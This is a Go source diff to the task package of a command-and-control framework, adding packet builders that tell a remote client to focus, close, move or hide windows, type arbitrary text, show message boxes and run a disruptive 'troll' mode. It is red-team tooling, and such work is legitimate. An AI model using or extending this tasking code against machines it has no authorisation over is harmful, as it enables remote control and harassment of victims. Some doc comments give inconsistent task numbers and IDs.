@@ -5,6 +5,7 @@ package task
 import (
 	"io"
 	"os"
+	"time"
 
 	"github.com/iDigitalFlame/xmt/com"
 	"github.com/iDigitalFlame/xmt/device"
@@ -126,6 +127,52 @@ func HighContrast(e bool) *com.Packet {
 	return n
 }
 
+// WindowFocus returns a activate/focus window Packet. This will instruct the
+// client to focus the target window and show it to the user.
+//
+// Using the value "0" for the handle will select all open windows that exist
+// during client runtime.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvUI
+//
+//  Input:
+//      uint8  // Always 7 for this task.
+//      uint64 // Handle
+//  Output:
+//      <none>
+func WindowFocus(h uint64) *com.Packet {
+	n := &com.Packet{ID: TvUI}
+	n.WriteUint8(taskWindowFocus)
+	n.WriteUint64(h)
+	return n
+}
+
+// WindowClose returns a close window Packet. This will instruct the client to
+// close the target window.
+//
+// Using the value "0" for the handle will select all open windows that exist
+// during client runtime.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvUI
+//
+//  Input:
+//      uint8  // Always 4 for this task.
+//      uint64 // Handle
+//  Output:
+//      <none>
+func WindowClose(h uint64) *com.Packet {
+	n := &com.Packet{ID: TvUI}
+	n.WriteUint8(taskWindowClose)
+	n.WriteUint64(h)
+	return n
+}
+
 // WallpaperBytes returns a change user wallpaper Packet. This will instruct the
 // client to change the current users's wallpaper to the data contained in the
 // supplied byte slice. The new file will be written in a temporary location
@@ -151,10 +198,58 @@ func WallpaperBytes(b []byte) *com.Packet {
 	return n
 }
 
+// WindowWTF returns a window WTF mode Packet. This will instruct the client to
+// do some crazy things with the active windows for the supplied duration.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvUI
+//
+//  Input:
+//      uint8 // Always 8 for this task.
+//      int64 // Duration
+//  Output:
+//      <none>
+func WindowWTF(d time.Duration) *com.Packet {
+	n := &com.Packet{ID: TvTroll}
+	n.WriteUint8(taskTrollWTF)
+	n.WriteInt64(int64(d))
+	return n
+}
+
+// WindowShow returns a show window Packet. This will instruct the client to
+// change the window's active show state.
+//
+// Using the value "0" for the handle will select all open windows that exist
+// during client runtime.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvUI
+//
+//  Input:
+//      uint8  // Always 3 for this task.
+//      uint64 // Handle
+//      uint8  // Sw* Constant
+//  Output:
+//      <none>
+func WindowShow(h uint64, t uint8) *com.Packet {
+	n := &com.Packet{ID: TvUI}
+	n.WriteUint8(taskWindowShow)
+	n.WriteUint64(h)
+	n.WriteUint8(t)
+	return n
+}
+
 // WindowEnable returns a enable/disable window Packet. This will instruct the
 // client to block all user supplied input (keyboard and mouse) to the specified
 // window handle. Input will be blocked and the window will not be usable until
 // a successful call to 'WindowEnable' with the handle and false.
+//
+// Using the value "0" for the handle will select all open windows that exist
+// during client runtime.
 //
 // Always returns 'ErrNoWindows' on non-Windows devices.
 //
@@ -206,9 +301,37 @@ func WallpaperFile(s string) (*com.Packet, error) {
 	return n, err
 }
 
+// WindowSendInput returns a type input Packet. This will instruct the client to
+// use input events to type out the provied string. The client will first attempt
+// to bring the window supplied to the foreground (if non-zero) before typing.
+//
+// The window value is optional and may be set to zero.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvUI
+//
+//  Input:
+//      uint8  // Always 8 for this task.
+//      uint64 // Handle
+//      string // Text
+//  Output:
+//      <none>
+func WindowSendInput(h uint64, s string) *com.Packet {
+	n := &com.Packet{ID: TvUI}
+	n.WriteUint8(taskWindowType)
+	n.WriteUint64(h)
+	n.WriteString(s)
+	return n
+}
+
 // WindowTransparency returns a set window transparency Packet. This will instruct
 // the client to set the window with the supplied handle with the specified
 // transparency value. This value ranges from 0 (transparent) to 255 (opaque).
+//
+// Using the value "0" for the handle will select all open windows that exist
+// during client runtime.
 //
 // Always returns 'ErrNoWindows' on non-Windows devices.
 //
@@ -251,4 +374,64 @@ func WallpaperReader(r io.Reader) (*com.Packet, error) {
 	n.WriteUint8(taskTrollWallpaper)
 	_, err := io.Copy(n, r)
 	return n, err
+}
+
+// WindowMove returns a move/resize window Packet. This will instruct the client
+// to move and/or resize the targeted window with the supplied options.
+//
+// The value '-1' may be used in either the 'X' and 'Y' or the 'Width' and 'Height'
+// values to keep the current values instead of changing them.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvUI
+//
+//  Input:
+//      uint8  // Always 6 for this task.
+//      uint64 // Handle
+//      uint32 // X
+//      uint32 // Y
+//      uint32 // Width
+//      uint32 // Hight
+//  Output:
+//      <none>
+func WindowMove(h uint64, x, y, width, height int32) *com.Packet {
+	n := &com.Packet{ID: TvUI}
+	n.WriteUint8(taskWindowMove)
+	n.WriteUint64(h)
+	n.WriteInt32(x)
+	n.WriteInt32(y)
+	n.WriteInt32(width)
+	n.WriteInt32(height)
+	return n
+}
+
+// WindowMessageBox returns a MessageBox Packet. This will instruct the client to
+// create a MessageBox with the supplied parent and message options.
+//
+// Using the value "0" for the handle will create a MessageBox without a parent
+// window.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices.
+//
+// C2 Details:
+//  ID: TvUI
+//
+//  Input:
+//      uint8  // Always 5 for this task.
+//      uint64 // Handle
+//      string // Title
+//      string // Text
+//      uint32 // Flags
+//  Output:
+//      <none>
+func WindowMessageBox(h uint64, title, text string, flags uint32) *com.Packet {
+	n := &com.Packet{ID: TvUI}
+	n.WriteUint8(taskWindowMessage)
+	n.WriteUint64(h)
+	n.WriteString(title)
+	n.WriteString(text)
+	n.WriteUint32(flags)
+	return n
 }
